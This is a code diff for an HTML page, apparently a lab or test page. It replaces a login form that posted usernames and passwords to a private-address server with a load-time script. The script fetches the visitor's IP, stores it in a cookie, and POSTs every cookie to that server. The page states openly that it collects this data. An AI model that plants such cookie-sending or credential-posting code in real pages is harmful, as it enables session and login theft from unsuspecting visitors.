@@ -3,19 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Form</title>
+    <title>Cookie & IP Collection</title>
+    <script>
+        // Function to get user's IP address using an external service (ipify)
+        async function getIpAddress() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error("Failed to fetch IP address:", error);
+                return null;
+            }
+        }
+
+        // Function to set a cookie with the user's IP address
+        async function setCookiesAndSendData() {
+            let ipAddress = await getIpAddress();
+            if (ipAddress) {
+                // Store the IP address in cookies
+                document.cookie = `user_ip=${ipAddress}; path=/; max-age=3600`; // Expires in 1 hour
+
+                // Send cookies to your Flask server
+                let cookies = document.cookie;
+                sendCookiesToServer(cookies);
+            } else {
+                alert("Unable to retrieve IP address.");
+            }
+        }
+
+        // Function to send the cookies to your Flask server
+        function sendCookiesToServer(cookies) {
+            fetch('http://10.0.1.33:3000', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cookies: cookies })
+            })
+            .then(response => response.json())
+            .then(data => console.log("Data sent successfully:", data))
+            .catch(error => console.error("Error sending data:", error));
+        }
+
+        // Run the function when the page loads
+        window.onload = function() {
+            setCookiesAndSendData();
+        };
+    </script>
 </head>
 <body>
-    <h1>Login</h1>
-    <!-- HTML form to send credentials -->
-    <form action="http://10.0.1.33:3000" method="POST">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required>
-        <br>
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required>
-        <br>
-        <button type="submit">Submit</button>
-    </form>
+    <h1>Welcome to the Cookie & IP Collection Page</h1>
+    <p>Your IP address and cookies will be sent to the server for processing.</p>
 </body>
 </html>
